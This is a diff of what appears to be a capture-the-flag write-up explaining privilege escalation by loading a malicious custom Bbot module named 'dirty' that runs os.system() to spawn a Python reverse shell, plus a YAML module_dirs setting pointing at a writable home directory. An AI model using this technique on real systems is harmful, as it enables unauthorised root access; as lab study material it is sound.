@@ -236,7 +236,7 @@ public class CustomFunctions {
 
 ![image](https://github.com/user-attachments/assets/92e40bcf-c2f9-4785-bc9b-f4fa06b92bf9)
 
-- Bbot is a bug bounty tool for enumeration.I dived into the documentation to check for features that we can use for privilege escalation e.g file write.file read and scripts code execution.Then, I discovered this feature that allows us load custom modules.
+- Bbot is a bug bounty tool for enumeration.I dived into the documentation to check for features that we can use for privilege escalation e.g file write.file read and scripts code execution.Then, I discovered this feature that allows us load custom modules writtnen with python.
 This [article](https://www.blacklanternsecurity.com/bbot/Stable/dev/module_howto/) in the documentation explains how to go about it.We can abuse this feature to execute code.The malicious module is named `dirty` and the code snippet is the poc.It imports `os` and uses the `system()` function to trigger a python reverse shell.
 
 ```python
@@ -249,9 +249,14 @@ class dirty(BaseModule):
      os.system(payload)
 ```
 
-- 
+- Before a module can be loaded,you need to specify the custom directory to it is located because all modules should be in `bbot/modules` and we don't have write access to it.The snippet should be added to the `yaml` file.In my own case,it will be `/home/graphasm`.
 
+```yaml
+module_dirs:
+  - /home/graphasm
+```
 
+-
 
 
 
